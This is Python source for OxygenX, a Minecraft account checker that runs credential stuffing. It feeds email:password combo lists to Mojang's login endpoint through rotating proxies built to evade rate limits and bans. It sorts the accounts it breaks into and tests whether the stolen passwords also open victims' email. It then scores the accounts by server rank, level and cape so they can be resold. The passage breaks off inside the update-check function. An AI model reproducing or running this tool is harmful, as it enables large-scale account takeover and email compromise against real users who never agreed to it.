from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from multiprocessing.dummy import Pool as ThreadPool
from os import mkdir, path, system, name
from random import choice
from re import compile
from threading import Thread, Lock
from time import sleep, strftime, time, gmtime
from traceback import format_exc

from cloudscraper import create_scraper
from colorama import init, Fore
from console.utils import set_title
from easygui import fileopenbox
from requests import Session, exceptions
from yaml import safe_load

default_values = '''#       ________                                     ____  ___
#       \_____  \ ___  ______.__. ____   ____   ____ \   \/  /
#        /   |   \\\  \/  <   |  |/ ___\_/ __ \ /    \ \     /
#       /    |    \>    < \___  / /_/  >  ___/|   |  \/     \\
#       \_______  /__/\_ \/ ____\___  / \___  >___|  /___/\  \\
#               \/      \/\/   /_____/      \/     \/      \_/
#
#                   -Created and coded by ShadowOxygen
#                   -Code cleaned and revised by MohanadHosny#9152
#                   -Settings file for OxygenX-0.8

OxygenX:

  # Check if current version of OxygenX is latest
  check_for_updates: true

  # Amount of checks for a account many times to check a account. will be slower if retries is set higher
  # Needs to be 1 or higher (Recommanded: 1-2 for paid proxies, 3-6 for public proxies.)
  retries: 3

  # Higher for better accuracy but slower (counted in milliseconds, example: 6000ms = 6 seconds)
  timeout: 6000

  # Threads for account checking
  threads: 200
  
  # Remove all duplicates in combolist
  combo_duplicates: true
  
  # Remove all duplicates in proxylist/api
  proxy_duplicates: true
  
  # Check hits if its a mail access
  mail_access: true
  
  # Save ranked accounts in NFA.txt or SFA.txt (Turn it off for ranked accounts NOT to save in NFA.txt or SFA.txt)
  save_ranked_type: true
  
  # Print bad accounts
  print_bad: true
  
  # Save bad accounts
  save_bad: true

  # Normal users should keep this false unless problem start happening
  debugging: false
  
  
  capes:
    # Check capes
    liquidbounce: true
    optifine: true
    labymod:  true
    mojang:  true

  rank:
  # Set true if you want to check the ranks/level
    mineplex: true
    hypixel:  true
    hivemc: true
    veltpvp: true

  level:
    # Save High leveled accounts in files.
    hypixel: true
    mineplex: true
    
    # Minimum high level accounts
    hypixel_level: 25
    mineplex_level: 25

  proxy:
    # If proxies should be used, Will be proxyless if set to false (Recommended to use VPN if this is set to false.)
    proxy: true
    # Proxy types: https | socks4 | socks5
    proxy_type: 'socks4'
    # EXPERMENTAL! Still in testing stage, may have problems
    # Locks the proxy so other threads can't use it
    lock_proxy: false
    # EXPERMENTAL! Still in testing stage, may have problems
    # Auto remove proxies (you can limit the proxies removed with proxy_remove_limit)
    remove_bad_proxy: false
    # EXPERMENTAL! Still in testing stage, may have problems
    # If remove bad proxies are on, once the proxy list hits the limit it will stop removing bad proxies
    proxy_remove_limit: 2000
    # If proxies be used for checking sfas (Will be slower but if false, you may get ip banned)
    proxy_for_sfa: false
    # Sleep between checks if proxy mode is false (put 0 for no sleep) counted in secouds
    sleep_proxyless: 30
    
    api:
      # If proxy api link to be used.
      use: false
      # If proxy_use_api is true, put api link in the parentheses
      api_link: "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=3000"
      # If proxy_use_api is true, put a number for seconds to refresh the link (every number under 30 is for no refreshing time, recommend refresh time: 300 seconds aka 5 minutes)
      refresh_time: 300
'''

if path.exists('Settings.yml'):
    settings = safe_load(open('Settings.yml', 'r', errors='ignore'))
else:
    open('Settings.yml', 'w').write(default_values)
    settings = safe_load(open('Settings.yml', 'r', errors='ignore'))


class Counter:
    nfa = 0
    error = 0
    sfa = 0
    unfa = 0
    demo = 0
    hits = 0
    bad = 0
    optifine = 0
    mojang = 0
    labymod = 0
    liquidbounce = 0
    special_name = 0
    hivemcrank = 0
    mineplexrank = 0
    mineplexhl = 0
    hypixelrank = 0
    hypixelhl = 0
    hivelevel = 0
    mfa = 0
    nohypixel = 0
    nomineplex = 0
    veltrank = 0
    checked = 0
    cpm = 0
    legacy_name = 0


class Main:
    def __init__(self):
        self.stop_time = True
        self.announcement = ''
        self.start_time = 0
        self.accounts = []
        self.proxylist = []
        self.folder = ''
        self.unmigrated = False
        if OxygenX.Cape.lb:
            self.lbcape = str(self.liquidbounce())
        print(t)
        print(f'{red}[!] Please remember to configure your settings file before using OxygenX\n')
        print(f'{cyan}[Mode] Choose checker mode\n'
              '[>] 1 for Normal Mode\n'
              '[>] 2 for Unmigrated Mode')
        mode = input('> ')
        if mode == '2':
            self.unmigrated = True
        else:
            pass
            print('\nSelected Normal Mode')
        self.loadcombo()
        self.loadproxy()
        self.resultfolder()
        print(f'\n{cyan}Starting Threads...')
        Thread(target=self.cpm_counter, daemon=True).start()
        self.start_checker()
        print(f'[{red}Exit{white}] You can now close OxygenX...\n')
        input()
        exit()

    def prep(self, line):
        if ':' in line:
            try:
                email, password = line.split(':', 1)
                original_line = line
                original_email = email
                if self.unmigrated:
                    if '@' in email:
                        email = email.split('@')[0]
                        if not any(x in email for x in charz):
                            line = f'{email}:{password}'
                        else:
                            Counter.checked += 1
                            Counter.bad += 1
                            self.prints(f'{red}[Badline] {blue}- {red}{line}')
                            self.writing([line, 'Badline'])
                            return
                        reply = self.checkname(email)
                        if not reply:
                            Counter.checked += 1
                            Counter.bad += 1
                            if OxygenX.print_bad:
                                self.prints(f'{red}[Bad] {blue}- {red}{line}')
                            if OxygenX.save_bad:
                                self.writing([line, 'Bad'])
                            return
                        else:
                            Counter.legacy_name += 1
                    else:
                        pass
                answer = self.checkmc(user=email, passw=password)
                Counter.checked += 1
                if 'Invalid credentials' in answer:
                    Counter.bad += 1
                    if OxygenX.print_bad:
                        self.prints(f'{red}[Bad] {blue}- {red}{line}')
                    if OxygenX.save_bad:
                        self.writing([line, 'Bad'])
                    return
                texta = answer.text
                if '[]' in texta:
                    self.prints(f'{yellow}[Demo] {blue}- {yellow}{line}')
                    Counter.demo += 1
                    self.writing([line, 'Demo'])
                    return
                else:
                    ajson = answer.json()
                    uuid = ajson['availableProfiles'][0]["id"]
                    username = ajson['availableProfiles'][0]['name']
                    self.writing([line, 'Hits'])
                    token = ajson['accessToken']
                    dosfa = True
                    sfa = False
                    saveranked = True
                    if self.unmigrated:
                        data = ['=======================================\n'
                                f'Original Combo: {original_line}\n'
                                f'Unmigrated Combo: {line}\n'
                                f'Username: {username}\n'
                                f'UUID: {uuid}\n'
                                f'Email?: {original_email}\n'
                                f'Password: {password}']
                    else:
                        data = ['=======================================\n'
                                f'Original Combo: {line}\n'
                                f'Username: {username}\n'
                                f'UUID: {uuid}\n'
                                f'Email: {email}\n'
                                f'Password: {password}']

                    if "legacy': True" in str(ajson) or (
                            self.unmigrated and "legacy': True" in str(ajson)):
                        Counter.unfa += 1
                        self.prints(f'{magenta}[Unmigrated]{blue} - {green}{line}')
                        self.writing([line, 'Unmigrated'])
                        data.append('\nUnmigrated: True')
                        dosfa = False

                    if dosfa or not self.unmigrated:
                        securec = self.secure_check(token=token)
                        if securec:
                            Counter.sfa += 1
                            self.prints(f'{cyan}[SFA]{blue} - {green}{line}{blue} | {green}Username: {username}')
                            sfa = True
                            data.append('\nSFA: True')
                        else:
                            Counter.nfa += 1
                            self.prints(f'{green}[NFA]{blue} - {green}{line}{blue} | {green}Username: {username}')
                    Counter.hits += 1

                    if len(username) <= 3 or any(x in username for x in charz):
                        Counter.special_name += 1
                        self.writing([f'{line} | Username: {username}', 'SpecialName'])
                        data.append('\nSpecial Name: True')

                    with ThreadPoolExecutor(max_workers=9) as exe:
                        hypixel = exe.submit(self.hypixel, uuid, line).result()
                        mineplex = exe.submit(self.mineplex, username, line).result()
                        hiverank = exe.submit(self.hivemc, uuid, line).result()
                        mailaccess = exe.submit(self.mailaccess, original_line).result()
                        veltrank = exe.submit(self.veltpvp, username, line).result()
                        mojang = exe.submit(self.mojang, uuid, line, username).result()
                        optifine = exe.submit(self.optifine, username, line).result()
                        labycape = exe.submit(self.labymod, uuid, line, username).result()
                        skyblock = exe.submit(self.skyblock, uuid).result()
                    try:
                        if mojang:
                            data.append('\nMojang Cape: True')

                        if optifine:
                            data.append('\nOptifine Cape: True')

                        if labycape:
                            data.append('\nLabymod Cape: True')

                        if OxygenX.Cape.lb:
                            if uuid in self.lbcape:
                                Counter.liquidbounce += 1
                                self.writing([f'{line} | Username: {username}', 'LiquidBounceCape'])
                                data.append('\nLiquidBounce Cape: True')

                        if dosfa:
                            if mailaccess:
                                data.append('\nMFA: True')

                        if veltrank:
                            if not OxygenX.ranktype:
                                saveranked = False
                            data.append(f'\nVelt Rank: {veltrank}')

                        if hiverank:
                            data.append(f'\nHive Rank: {str(hiverank)}')
                            if not OxygenX.ranktype:
                                saveranked = False

                        if OxygenX.Rank.mineplex or OxygenX.Level.mineplex:
                            if mineplex[0]:
                                data.append(f'\nMineplex Rank: {mineplex[0]}')
                                if not OxygenX.ranktype:
                                    saveranked = False
                            if mineplex[1]:
                                data.append(f'\nMineplex Level: {str(mineplex[1])}')
                            if not mineplex[0] and not mineplex[1]:
                                data.append(f'\nNo Mineplex Login: True')

                        if OxygenX.Rank.hypixel or OxygenX.Level.hypixel:
                            if not hypixel[2]:
                                if str(hypixel[0]) not in ['None', 'False']:
                                    if not OxygenX.ranktype:
                                        saveranked = False
                                    data.append(f'\nHypixel Rank: {hypixel[0]}')
                                if hypixel[1]:
                                    data.append(f'\nHypixel Level: {str(hypixel[1])}')
                                if hypixel[3]:
                                    data.append(f'\nHypixel LastLogout Date: {hypixel[3]}')
                                if hypixel[4] != 0:
                                    data.append(f'\nHypixel SkyWars Coins: {str(hypixel[4])}')
                                if hypixel[5] != 0:
                                    data.append(f'\nHypixel BedWars Level: {str(hypixel[5])}')
                                if hypixel[6] != 0:
                                    data.append(f'\nHypixel BedWars Coins: {str(hypixel[6])}')
                                if skyblock:
                                    data.append(f'\nHypixel SkyBlock Stats: https://sky.lea.moe/stats/{uuid}')
                            else:
                                data.append(f'\nNo Hypixel Login: True')
                    except:
                        if OxygenX.debug:
                            self.prints(f'{red}[Error] {line} \nRank/Cape Check Error: {format_exc(limit=1)}')
                    if saveranked and dosfa:
                        if sfa:
                            self.writing([line, 'SFA'])
                        else:
                            self.writing([line, 'NFA'])

                    self.writing([''.join(data), 'CaptureData'])
                    return
            except:
                if OxygenX.debug:
                    self.prints(f'{red}[Error] {line} \nError: {format_exc(limit=1)}')
                self.writing([line, 'Error'])
                Counter.error += 1
                return
        else:
            Counter.checked += 1
            Counter.bad += 1
            self.prints(f'{red}[Badline] {line}')
            self.writing([line, 'Badlines'])
            return

    def checkmc(self, user, passw, ):
        payload = ({
            'agent': {
                'name': 'Minecraft',
                'version': 1
            },
            'username': user,
            'password': passw,
            'requestUser': 'true'
        })
        bad = 'Invalid credentials'
        retries = 0
        if not OxygenX.Proxy.proxy:
            while True:
                if retries != OxygenX.retries:
                    try:
                        answer = session.post(url=auth_mc, json=payload, headers=jsonheaders,
                                              timeout=OxygenX.timeout)
                        if bad in answer.text:
                            retries += 1
                            sleep(OxygenX.Proxy.sleep)
                            continue
                        elif 'Client sent too many requests too fast.' in answer.text:
                            sleep(5)
                            continue
                        else:
                            return answer
                    except:
                        if OxygenX.debug:
                            self.prints(f'CheckMC ProxyLess: \n{format_exc(limit=1)}')
                        continue
                else:
                    return bad
        else:
            while True:
                if retries != OxygenX.retries:
                    proxy_form = {}
                    proxy = choice(self.proxylist)
                    if proxy.count(':') == 3:
                        spl = proxy.split(':')
                        proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                    else:
                        proxy = proxy
                    locked = OxygenX.Proxy.lock_proxy
                    if proxy in ['', '\n']:
                        try:
                            self.proxylist.remove(proxy)
                            continue
                        except:
                            pass
                    if locked:
                        try:
                            self.proxylist.remove(proxy)
                        except:
                            locked = False
                    if OxygenX.Proxy.type in ['https', 'http']:
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif OxygenX.Proxy.type in ['socks4', 'socks5']:
                        line = f"{OxygenX.Proxy.type}://{proxy}"
                        proxy_form = {'http': line, 'https': line}
                    try:
                        answer = scraper.post(url=auth_mc, proxies=proxy_form, json=payload, headers=jsonheaders,
                                              timeout=OxygenX.timeout)
                        if locked:
                            self.proxylist.append(proxy)
                        if bad in answer.text:
                            retries += 1
                            continue
                        elif answer.headers.get("Content-Type").__contains__("html"):
                            if OxygenX.Proxy.remove_bad_proxy and len(
                                    self.proxylist) >= OxygenX.Proxy.proxy_remove_limit:
                                if not locked:
                                    try:
                                        self.proxylist.remove(proxy)
                                    except:
                                        pass
                            continue
                        else:
                            return answer
                    except exceptions.RequestException:
                        if OxygenX.Proxy.remove_bad_proxy and len(self.proxylist) >= OxygenX.Proxy.proxy_remove_limit:
                            if not locked:
                                try:
                                    self.proxylist.remove(proxy)
                                except:
                                    pass
                        elif locked:
                            self.proxylist.append(proxy)
                    except:
                        if locked:
                            self.proxylist.append(proxy)
                        if OxygenX.debug:
                            self.prints(f'CheckMC: \n{format_exc(limit=1)}')
                        continue
                else:
                    return bad

    def secure_check(self, token):
        headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
        try:
            if not OxygenX.Proxy.proxy or not OxygenX.Proxy.sfa_proxy:
                try:
                    z = session.get(url=sfa_url, headers=headers).text
                    if z == '[]':
                        return True
                    else:
                        return False
                except:
                    if OxygenX.debug:
                        self.prints(f'ErrorSFA ProxyLess: \n{format_exc(limit=1)}')
                    return False
            else:
                while True:
                    proxy_form = {}
                    proxy = choice(self.proxylist)
                    if proxy.count(':') == 3:
                        spl = proxy.split(':')
                        proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                    else:
                        proxy = proxy
                    if proxy in ['', '\n']:
                        try:
                            self.proxylist.remove(proxy)
                            continue
                        except:
                            pass
                    if OxygenX.Proxy.type == 'http' or OxygenX.Proxy.type == 'https':
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif OxygenX.Proxy.type == 'socks4' or OxygenX.Proxy.type == 'socks5':
                        line = f"{OxygenX.Proxy.type}://{proxy}"
                        proxy_form = {'http': line, 'https': line}
                    try:
                        resp = session.get(url=sfa_url, headers=headers, proxies=proxy_form).text
                        if 'request blocked' in resp.lower():
                            continue
                        elif resp == '[]':
                            return True
                        else:
                            return False
                    except exceptions.RequestException:
                        if OxygenX.Proxy.remove_bad_proxy and len(self.proxylist) >= OxygenX.Proxy.proxy_remove_limit:
                            try:
                                self.proxylist.remove(proxy)
                            except:
                                pass
                        continue
        except:
            if OxygenX.debug:
                self.prints(f'Error SFA: \n{format_exc(limit=1)}')
            return False

    def checkname(self, username):
        try:
            if OxygenX.Proxy.proxy:
                while True:
                    proxy_form = {}
                    proxy = choice(self.proxylist)
                    if proxy.count(':') == 3:
                        spl = proxy.split(':')
                        proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                    else:
                        proxy = proxy
                    if OxygenX.Proxy.type == 'http' or OxygenX.Proxy.type == 'https':
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif OxygenX.Proxy.type == 'socks4' or OxygenX.Proxy.type == 'socks5':
                        line = f"{OxygenX.Proxy.type}://{proxy}"
                        proxy_form = {'http': line, 'https': line}
                    try:
                        answer = scraper.post(url=user_url, json=[username], proxies=proxy_form, headers=mailheaders,
                                              timeout=OxygenX.timeout).text
                        if 'The request could not be satisfied' in answer:
                            continue
                        elif 'legacy":true' in answer:
                            return True
                        else:
                            return False
                    except exceptions.RequestException:
                        if OxygenX.Proxy.remove_bad_proxy and len(self.proxylist) >= OxygenX.Proxy.proxy_remove_limit:
                            try:
                                self.proxylist.remove(proxy)
                            except:
                                pass
                        continue
            else:
                try:
                    sleep(OxygenX.Proxy.sleep)
                    answer = scraper.post(url=user_url, json=[username], headers=mailheaders,
                                          timeout=OxygenX.timeout).text
                    if 'legacy":true' in answer:
                        return True
                    else:
                        return False
                except:
                    if OxygenX.debug:
                        self.prints(f'{red}[Error Check] {format_exc(limit=1)}')
                    return False
        except:
            if OxygenX.debug:
                self.prints(f'{red}[Error Check] {format_exc(limit=1)}')
            return False

    def title(self):
        while self.stop_time:
            if not self.unmigrated:
                set_title(
                    f"OxygenX-{version}"
                    f" | Hits: {Counter.hits}"
                    f" - Bad: {Counter.bad}"
                    f'{"" if Counter.nfa == 0 else f" - NFA: {Counter.nfa}"}'
                    f'{"" if Counter.sfa == 0 else f" - SFA: {Counter.sfa}"}'
                    f'{"" if Counter.unfa == 0 else f" - Unmigrated: {Counter.unfa}"}'
                    f'{"" if Counter.demo == 0 else f" - Demo: {Counter.demo}"}'
                    f"{'' if Counter.mfa == 0 else f' - MFA: {Counter.mfa}'}"
                    f"{'' if Counter.error == 0 else f' | Errors: {Counter.error}'}"
                    f" | Left: {len(self.accounts) - Counter.checked}/{len(self.accounts)}"
                    f'{"" if not OxygenX.Proxy.proxy else f" - Proxies: {len(self.proxylist)}"}'
                    f' | CPM: {Counter.cpm}'
                    f' | {self.now_time()} Elapsed')
            else:
                set_title(
                    f"OxygenX-{version} | "
                    f"Hits: {Counter.hits}"
                    f" - Bad: {Counter.bad}"
                    f'{"" if Counter.legacy_name == 0 else f" - Legacy Lines: {Counter.legacy_name}"}'
                    f'{"" if Counter.unfa == 0 else f" - Unmigrated: {Counter.unfa}"}'
                    f"{'' if Counter.error == 0 else f' | Errors: {Counter.error}'}"
                    f" | Left: {len(self.accounts) - Counter.checked}/{len(self.accounts)}"
                    f'{"" if not OxygenX.Proxy.proxy else f" - Proxies: {len(self.proxylist)}"}'
                    f' | CPM: {Counter.cpm}'
                    f' | {self.now_time()} Elapsed | Unmigrated Checker')

    def prints(self, line):
        lock.acquire()
        print(f'{blue}{self.now_time()} {line}')
        lock.release()

    def writing(self, line):
        lock.acquire()
        open(f'{self.folder}/{line[1]}.txt', 'a', encoding='u8').write(f'{line[0]}\n')
        lock.release()

    def optifine(self, user, combo):
        cape = False
        if OxygenX.Cape.optifine:
            try:
                optifine = session.get(url=f'http://s.optifine.net/capes/{user}.png').text
                if 'Not found' not in optifine:
                    cape = True
                    Counter.optifine += 1
                    self.writing([f'{combo} | Username: {user}', 'OptifineCape'])
                return cape
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Error Optifine:\n{format_exc(limit=1)}')
        return cape

    def mojang(self, uuid, combo, user):
        cape = False
        if OxygenX.Cape.mojang:
            try:
                mine = session.get(url=f'https://crafatar.com/capes/{uuid}', headers=mailheaders).text.lower()
                if 'png' in mine:
                    cape = True
                    Counter.mojang += 1
                    self.writing([f'{combo} | Username: {user}', 'MojangCape'])
                return cape
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Error MojangCape:\n{format_exc(limit=1)}')
        return cape

    def labymod(self, uuid, combo, user):
        cape = False
        if OxygenX.Cape.laby:
            link = f'https://capes.labymod.net/capes/{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}'
            try:
                laby = session.get(url=link, headers=mailheaders).text
                if 'Not Found' not in laby:
                    cape = True
                    Counter.labymod += 1
                    self.writing([f'{combo} | Username: {user}', 'LabymodCape'])
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Error Labymod:\n{format_exc(limit=1)}')
        return cape

    def liquidbounce(self):
        try:
            lbc = session.get(
                url='https://raw.githubusercontent.com/CCBlueX/FileCloud/master/LiquidBounce/cape/service.json',
                headers=mailheaders).text
            return lbc
        except:
            if OxygenX.debug:
                self.prints(f'{red}Error LiquidBounce:\n{format_exc(limit=1)}')
            return False

    def hivemc(self, uuid, combo):
        rank = False
        if OxygenX.Rank.hivemc:
            try:
                response = session.get(url=f'https://www.hivemc.com/player/{uuid}', headers=mailheaders).text
                match = rankhv.search(response).group(1)
                if match != 'Regular':
                    rank = match
            except AttributeError:
                rank = False
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Error HiveMC:\n{format_exc(limit=1)}')
            if rank:
                self.writing([f'{combo} | Rank: {str(rank)}', 'HiveRanked'])
                Counter.hivemcrank += 1
            return rank

    def mineplex(self, username, combo):
        both = [False, False]
        if OxygenX.Rank.mineplex or OxygenX.Level.mineplex:
            try:
                response = session.get(url=f'https://www.mineplex.com/players/{username}',
                                       headers=mailheaders).text
                if 'That player cannot be found.' in response:
                    both[0] = False
                    both[1] = False
                else:
                    both[0] = str(rankmp.search(response).group(1))
                    both[1] = int(levelmp.search(response).group(1))
                    if both[0].lower() == '':
                        both[0] = False
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Error Mineplex:\n{format_exc(limit=1)}')
            if both[0]:
                Counter.mineplexrank += 1
                self.writing([f'{combo} | Rank: {both[0]}', 'MineplexRanked'])
            if both[1] and OxygenX.Rank.mineplex:
                if both[1] >= OxygenX.Level.mineplex_level:
                    Counter.mineplexhl += 1
                    self.writing([f'{combo} | Level: {str(both[1])}', 'MineplexHighLevel'])
            if not both[0] and not both[1]:
                Counter.nomineplex += 1
                self.writing([combo, 'NoMineplexLogin'])
        return both

    def hypixel(self, uuid, combo):
        both = [False, False, False, False, 0, 0, 0]
        if OxygenX.Rank.hypixel or OxygenX.Level.hypixel:
            try:
                answer = session.get(url=f'https://api.slothpixel.me/api/players/{uuid}',
                                     headers=mailheaders).json()
                if 'Failed to get player uuid' not in str(answer):
                    rank = str(answer['rank'])
                    if '_PLUS' in rank:
                        rank = rank.replace('_PLUS', '+')
                    level = int(answer["level"])
                    nolog = str(answer['username'])
                    bedwars_level = int(answer['stats']['BedWars']['level'])
                    bedwars_coins = int(answer['stats']['BedWars']['coins'])
                    skywars_coins = int(answer['stats']['SkyWars']['coins'])
                    if nolog == 'None':
                        both[2] = True
                    else:
                        both[0] = str(rank)
                        both[1] = int(round(level))
                        both[3] = str(datetime(1970, 1, 1, tzinfo=timezone.utc) + timedelta(
                            milliseconds=int(answer['last_login']))).split(' ')[0]
                        both[4] = skywars_coins
                        both[5] = bedwars_level
                        both[6] = bedwars_coins
                else:
                    both[2] = True
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Slothpixel API Error: \n{format_exc(limit=1)}')
            if not both[2]:
                if str(both[0]) not in ['None', 'False']:
                    Counter.hypixelrank += 1
                    self.writing([f'{combo} | Rank: {both[0]}', 'HypixelRanked'])
                if both[1] >= OxygenX.Level.hypixel_level:
                    Counter.hypixelhl += 1
                    self.writing([f'{combo} | Level: {str(both[1])}', 'HypixelHighLevel'])
            else:
                Counter.nohypixel += 1
                self.writing([combo, 'NoHypixelLogin'])
        return both

    def skyblock(self, uuid):
        try:
            link = f'https://sky.lea.moe/stats/{uuid}'
            check = session.get(url=link).text
            if 'Show SkyBlock stats for' in check:
                return False
            else:
                return link
        except:
            if OxygenX.debug:
                self.prints(f'{red}Error SkyBlock \n{format_exc(limit=1)}')
            return False

    def veltpvp(self, username, combo):
        rank = False
        if OxygenX.Rank.veltpvp:
            try:
                link = session.get(url=f'https://www.veltpvp.com/u/{username}', headers=mailheaders).text
                if 'Not Found' not in link:
                    rank = veltrankz.search(link).group(1)
                    if rank not in ['Default', 'Standard']:
                        rank = rank
                    else:
                        rank = False
            except AttributeError:
                rank = False
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Error Veltpvp:\n{format_exc(limit=1)}')
            if rank:
                self.writing([f'{combo} | Rank: {rank}', 'VeltRanked'])
                Counter.veltrank += 1
        return rank

    def mailaccess(self, combo):
        email, password = combo.split(':', 1)
        mailaccess = False
        if OxygenX.emailaccess:
            try:
                ans = session.get(
                    url=f'https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login={email}&Password={password}',
                    headers=mailheaders).text
            except:
                if OxygenX.debug:
                    self.prints(f'{red}Error Mail Access: \n{format_exc(limit=1)}')
                ans = 'BAD'
            if ans == 'Ok=1':
                mailaccess = True
                Counter.mfa += 1
                self.writing([combo, 'EmailAccess'])
            return mailaccess

    def rproxies(self):
        while self.stop_time:
            try:
                sleep(OxygenX.Proxy.API.refresh)
                loader = session.get(OxygenX.Proxy.API.api).text.splitlines()
                if OxygenX.proxy_dup:
                    self.proxylist = list(set([x.strip() for x in loader if ":" in x and x != '']))
                else:
                    self.proxylist = [x.strip() for x in loader if ":" in x and x != '']

            except:
                if OxygenX.debug:
                    print(f"{red}Error while refreshing proxies: \n{format_exc(limit=1)}\n")
                sleep(60)
                break

    def now_time(self):
        return strftime("%H:%M:%S", gmtime(time() - self.start_time))

    def loadcombo(self):
        while True:
            try:
                print(f"{cyan}Please Import Your Combo List...")
                sleep(0.3)
                loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8",
                              errors='ignore').read().split('\n')
                if OxygenX.combo_dup:
                    self.accounts = list(set(x.strip() for x in loader if x != ''))
                else:
                    self.accounts = [x.strip() for x in loader if x != '']
                if len(self.accounts) == 0:
                    print(f'{red}No combo found!, Please make sure file have combos...\n')
                    continue
                print(f"{magenta} > Imported {len(self.accounts)} lines")
                break
            except:
                if OxygenX.debug:
                    print(f"{red}Error while loading combo: \n{format_exc(limit=1)}\n")

    #   Load Proxy   #
    def loadproxy(self):
        while True:
            try:
                if OxygenX.Proxy.proxy:
                    idk = True
                    loader = []
                    if not OxygenX.Proxy.API.use:
                        print(f"\n{cyan}Please Import Your Proxies List.....")
                        sleep(0.3)
                        loader = open(fileopenbox(title="Load Proxies List", default="*.txt"), 'r', encoding="utf8",
                                      errors='ignore').read().split('\n')
                    elif OxygenX.Proxy.API.use:
                        try:
                            idk = False
                            loader = session.get(OxygenX.Proxy.API.api).text.split("\n")
                            if OxygenX.Proxy.API.refresh >= 30:
                                Thread(target=self.rproxies, daemon=True).start()
                                sleep(2)
                        except:
                            if OxygenX.debug:
                                print(
                                    f"{red}Error while loading proxies from api: \n{format_exc(limit=1)}\n")
                            sleep(60)
                            break
                    if OxygenX.proxy_dup:
                        self.proxylist = list(set([x.strip() for x in loader if ":" in x and x != '']))
                    else:
                        self.proxylist = [x.strip() for x in loader if ":" in x and x != '']
                    length_file = len(self.proxylist)
                    if length_file == 0:
                        print(f'{red}No proxies found! Please make sure file have proxies...')
                        continue
                    elif length_file == 0 and OxygenX.Proxy.API:
                        print(f'{red}No proxies found in API, OxygenX will exit in 3 seconds...')
                        sleep(3)
                        exit()
                    print(f"{magenta} > Imported {length_file} proxies from {'File' if idk else 'API'}")
                    break
                else:
                    break
            except:
                if OxygenX.debug:
                    print(f"{red}Error while loading proxies: \n{format_exc(limit=1)}\n")
                sleep(60)
                break

    def resultfolder(self):
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.folder = f'results/{unix}'
        if not path.exists('results'):
            mkdir('results')
        if not path.exists(self.folder):
            mkdir(self.folder)

    def get_announcement(self):
        try:
            announcement = session.get(
                'https://raw.githubusercontent.com/ShadowOxygen/OxygenX/master/announcement').text.split("Color: ")
            color = announcement[1].lower()
            if color == 'red\n':
                color = red
            elif color == 'white\n':
                color = white
            elif color == 'blue\n':
                color = blue
            elif color == 'green\n':
                color = green
            elif color == 'cyan\n':
                color = cyan
            elif color == 'magenta\n':
                color = magenta
            elif color == 'yellow\n':
                color = yellow
            self.announcement = f"{color}{announcement[0]}"
        except:
            if OxygenX.debug:
                print(f"{red}Error while displaying announcement: \n{format_exc(limit=1)}\n")
            return

    def start_checker(self):
        if OxygenX.threads > len(self.accounts):
            OxygenX.threads = int(len(self.accounts))
        self.get_announcement()
        mainpool = ThreadPool(processes=OxygenX.threads)
        clear()
        print(t)
        print(self.announcement)
        self.start_time = time()
        Thread(target=self.title).start()
        mainpool.imap_unordered(func=self.prep, iterable=self.accounts)
        mainpool.close()
        mainpool.join()
        symbo = f'[{Fore.GREEN}>{white}]'
        cyanz = f'[{Fore.CYAN}>{white}]'
        result = f'{white}\n\n[{Fore.YELLOW}>{white}] Results: \n\n' \
            f'[{green}+{white}] Hits: {Counter.hits}\n' \
            f'[{red}-{white}] Bad: {Counter.bad}{white}\n\n' \
            f'[{yellow}>{white}] Demo: {Counter.demo}\n' \
            f'[{green}>{white}] NFA: {Counter.nfa}\n' \
            f'{cyanz} SFA: {Counter.sfa}\n' \
            f'[{blue}>{white}] MFA: {Counter.mfa}\n' \
            f'[{magenta}>{white}] Unmigrated: {Counter.unfa}\n\n' \
            f'{symbo} NoHypixel Login accounts: {Counter.nohypixel}\n' \
            f'{symbo} NoMineplex Login accounts: {Counter.nomineplex}\n' \
            f'{symbo} Mojang capes: {Counter.mojang}\n' \
            f'{symbo} Optifine capes: {Counter.optifine}\n' \
            f'{symbo} Labymod capes: {Counter.labymod}\n' \
            f'{symbo} LiquidBounce capes: {Counter.liquidbounce}\n' \
            f'{symbo} Hypixel Ranked accounts: {Counter.hypixelrank}\n' \
            f'{symbo} Mineplex Ranked accounts: {Counter.mineplexrank}\n' \
            f'{symbo} HiveMC Ranked accounts: {Counter.hivemcrank}\n' \
            f'{symbo} Veltpvp Ranked accounts: {Counter.veltrank}\n' \
            f'{symbo} Hypixel {OxygenX.Level.hypixel_level}+ accounts: {Counter.hypixelhl}\n' \
            f'{symbo} Mineplex {OxygenX.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n\n' \
            f'{cyanz} Speed: {cyan}{round(Counter.checked / (time() - self.start_time), 2)} accounts/s\n' \
            f'{white}{cyanz} Total time checking: {cyan}{self.now_time()}\n\n' \
            f'[{magenta}x{white}] Finish checking..\n'
        self.stop_time = False
        print(result)

    def cpm_counter(self):
        while self.stop_time:
            if Counter.checked >= 1:
                now = Counter.checked
                sleep(3)
                Counter.cpm = (Counter.checked - now) * 20


def checkforupdates():
    try:
        gitversion = session.get(
            "https://raw.githubusercontent.com/ShadowOxygen/OxygenX/master/version.txt").text
        if f'{version}\n' != gitversion:
            print(t)
            print(f"{red}Your version is outdated.")
            print(f"Your version: {version}\n")
            print(f'Latest version: {gitversion}Get latest version in the link below')
            print(f"https://github.com/ShadowOxygen/OxygenX/releases\nStarting in 5 seconds...{cyan}")
